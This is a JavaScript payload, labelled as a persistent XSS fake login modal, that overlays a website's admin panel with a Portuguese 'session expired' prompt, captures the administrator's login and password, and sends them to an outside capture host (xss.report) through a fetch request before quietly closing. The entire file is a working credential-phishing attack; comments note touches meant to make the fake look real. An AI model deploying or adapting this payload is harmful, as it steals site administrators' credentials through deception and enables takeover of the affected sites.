/**
 * Emílio Farias - Persistent XSS Fake Login Modal V2 (Overlay Perfeito)
 */

(function() {
    if(document.getElementById('phishing_modal_111')) return;

    var css = `
    #phishing_modal_111 {
        position: fixed;
        top: 0; left: 0;
        width: 100vw; height: 100vh;
        /* Efeito de Vidro/Sombreado para ver o painel admin por trás, provando que é um timeout real */
        background: rgba(0, 0, 0, 0.85);
        backdrop-filter: blur(5px);
        z-index: 2147483647; 
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: Arial, sans-serif;
    }
    
    #p-fake-box {
        width: 520px;
        max-width: 90%;
        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        border-radius: 4px; /* Suavizar um pouco os cantos do modal para ficar mais profissional */
        overflow: hidden;
    }

    .p-pt25 { padding-top: 25px; }
    .p-pb18 { padding-bottom: 18px; }
    .p-back_2FACD8 { background-color: #2FACD8; }
    .p-cor_fff { color: #fff; }
    .p-tac { text-align: center; }
    .p-fz28 { font-size: 28px; }
    .p-ttu { text-transform: uppercase; }
    
    .p-container-inputs {
        padding: 30px 25px 10px 25px;
        background-color: #F8F8F8;
    }

    .p-input-group {
        display: block;
        margin-bottom: 16px;
    }

    .p-design { 
        height: 47px; 
        line-height: 47px; 
        border: 1px solid #E6E6E6; 
        padding: 0 10px; 
        font-size: 14px; 
        box-sizing: border-box; 
        width: 100%;
        outline: none;
    }

    .p-design:focus { border-color: #2FACD8; }

    .p-footer {
        padding: 20px;
        background-color: #F1F1F1;
        text-align: right;
    }

    .p-botao { 
        cursor: pointer; 
        padding: 15px 20px; 
        font-size: 11px; 
        text-transform: uppercase; 
        color: #fff; 
        border: none; 
        border-radius: 5px; 
        font-weight: bold;
    }
    .p-back_9E9E9E { background-color: #9E9E9E; margin-right: 10px;}
    .p-back_2EADD4 { background-color: #2EADD4; }
    .p-back_2EADD4:hover { background-color: #248cae; }
    `;

    var style = document.createElement('style');
    style.type = 'text/css';
    if (style.styleSheet) { style.styleSheet.cssText = css; } else { style.appendChild(document.createTextNode(css)); }
    document.head.appendChild(style);

    var div = document.createElement('div');
    div.id = 'phishing_modal_111';
    
    div.innerHTML = `
        <div id="p-fake-box">
            <h1 class="p-pt25 p-pb18 p-back_2FACD8" style="margin:0;">
                <p class="p-cor_fff p-tac p-fz28 p-ttu" style="margin:0; font-family: Arial, sans-serif;">Administração do Site</p>
                <p style="text-align:center; color:#fff; font-size:13px; margin-top:8px; font-weight:normal;">Sua Sessão Expirou. Por favor, efetue o login novamente.</p>
            </h1>

            <form id="p-fake-form" onsubmit="return false;">
                <div class="p-container-inputs">
                    <label class="p-input-group">
                        <input type="text" id="p_login" class="p-design" placeholder="Login Admin" required autocomplete="off" />
                    </label>

                    <label class="p-input-group">
                        <input type="password" id="p_senha" class="p-design" placeholder="Senha" required autocomplete="off" />
                    </label>
                </div>

                <div class="p-footer">
                    <button type="button" class="p-botao p-back_9E9E9E"> Esqueci minha senha? </button>
                    <button type="button" id="p-submit-btn" class="p-botao p-back_2EADD4"> Entrar no Painel </button>
                </div>
            </form>
        </div>
    `;

    // Garante que bloqueie rolagem da pagina de fundo
    document.body.style.overflow = "hidden";
    document.body.appendChild(div);

    document.getElementById('p-submit-btn').addEventListener('click', function() {
        var u = document.getElementById('p_login').value;
        var p = document.getElementById('p_senha').value;
        var btn = document.getElementById('p-submit-btn');

        if(u.trim() === "" || p.trim() === "") {
            // Vibra o botão se errar para fingir realismo
            btn.style.backgroundColor = "#ff4d4d";
            setTimeout(() => { btn.style.backgroundColor = "#2EADD4"; }, 1000);
            return;
        }

        btn.innerText = "Autenticando...";
        
        var targetWebhook = "https://xss.report/c/emilio_capture";
        
        // Exfiltra os dados e só depois fecha o modal
        fetch(targetWebhook + "?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p), {
            mode: 'no-cors',
            method: 'GET'
        }).then(() => {
            document.body.style.overflow = "auto";
            document.getElementById('phishing_modal_111').remove();
        }).catch(() => {
            document.body.style.overflow = "auto";
            document.getElementById('phishing_modal_111').remove();
        });
    });
})();
